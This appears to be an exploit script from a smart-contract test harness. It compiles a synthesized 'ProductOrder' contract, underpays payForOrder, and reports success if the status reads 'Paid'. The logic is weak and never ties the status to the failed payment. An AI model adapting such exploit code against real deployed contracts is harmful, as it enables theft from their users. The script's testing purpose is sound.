require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');
const { createLoggerWeb3 } = require('@lib/web3/deploy');



const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-11.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');


async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        // Attempt to pay for the order with an incorrect amount intentionally
        let incorrectAmount = web3.utils.toWei('0.001', 'ether'); // Assuming the price is higher than this
        try {
            await contractInstance.methods.payForOrder().send({
                from: web3.eth.accounts.wallet[0].address,
                value: incorrectAmount,
                gas: 3000000
            });
            await sleep(200);
        } catch (error) {
            console.log("Payment failed as expected due to incorrect amount.");
        }

        // Check the status, expecting it to incorrectly remain 'Paid'
        let currentStatus = await contractInstance.methods.status().call();
        if (currentStatus == "1") {  // Checking if status is 'Paid' which is 1
            console.log("Status incorrectly remains 'Paid' despite failed payment.");
            return true;
        } else {
            console.error("Status was corrected, exploit failed.");
            return false;
        }
    } catch (error) {
        console.error(error.stack);
        return false;
    }
}




module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
